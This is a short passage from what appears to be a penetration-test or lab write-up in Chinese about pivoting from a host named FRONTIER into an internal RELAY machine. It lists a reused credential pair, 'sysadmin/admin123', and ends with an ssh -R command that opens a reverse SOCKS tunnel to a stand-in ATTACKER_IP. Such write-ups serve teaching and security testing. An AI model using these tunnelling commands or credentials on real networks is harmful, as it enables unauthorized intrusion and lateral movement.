...
- 下一步：這組 `sysadmin/admin123` 同時是 OS 帳號，但 RELAY 沒有映射 SSH port，得先在 FRONTIER 自己拿到一個真正互動式的 shell 才能往裡面 pivot（見 9.）

---

## RELAY (dmz:172.20.1.12 / internal:10.10.0.12 / 無 host port)

### 9. Pivot 進 RELAY（不再能從攻擊機直接 SSH）
...
- 測試：在 9. 拿到的 relay shell 裡開一個反向 dynamic SOCKS 轉發回攻擊機自己的 sshd：`ssh -R 1080 <自己的帳號>@ATTACKER_IP -N`
